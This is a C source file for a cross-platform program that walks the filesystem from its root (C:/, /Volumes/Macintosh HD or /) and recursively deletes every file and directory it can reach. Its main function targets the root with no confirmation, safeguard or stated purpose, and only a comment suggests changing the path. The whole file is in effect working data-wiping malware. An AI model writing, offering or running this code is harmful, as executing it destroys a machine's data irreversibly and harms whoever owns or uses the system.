#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifdef _WIN32
    #include <windows.h>
    #define ROOT_PATH "C:/"
#elif __APPLE__
    #include <dirent.h>
    #define ROOT_PATH "/Volumes/Macintosh HD"
#else
    #include <dirent.h>
    #define ROOT_PATH "/"
#endif

void remove_file(const char *path) {
    #ifdef _WIN32
        if (remove(path) != 0) {
            perror("Error deleting file");
        }
    #else
        if (unlink(path) != 0) {
            perror("Error deleting file");
        }
    #endif
}

void remove_directory(const char *path) {
    #ifdef _WIN32
        WIN32_FIND_DATA find_file_data;
        HANDLE hFind;
        char search_path[MAX_PATH];

        snprintf(search_path, sizeof(search_path), "%s\\*", path);

        hFind = FindFirstFile(search_path, &find_file_data);
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("Error finding first file in %s\n", path);
            return;
        }

        do {
            if (strcmp(find_file_data.cFileName, ".") == 0 || strcmp(find_file_data.cFileName, "..") == 0) {
                continue;
            }

            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", path, find_file_data.cFileName);

            if (find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                remove_directory(full_path);
            } else {
                remove_file(full_path);
            }
        } while (FindNextFile(hFind, &find_file_data) != 0);

        FindClose(hFind);

        if (RemoveDirectory(path) == 0) {
            printf("Error removing directory %s\n", path);
        }
    #else
        DIR *dir;
        struct dirent *entry;
        struct stat path_stat;

        dir = opendir(path);
        if (dir == NULL) {
            perror("Error opening directory");
            return;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }

            char full_path[PATH_MAX];
            snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

            stat(full_path, &path_stat);
            if (S_ISDIR(path_stat.st_mode)) {
                remove_directory(full_path);
            } else {
                remove_file(full_path);
            }
        }

        closedir(dir);

        if (rmdir(path) != 0) {
            perror("Error removing directory");
        }
    #endif
}

int main() {
    remove_directory(ROOT_PATH); // Change this path as necessary
    return 0;
}
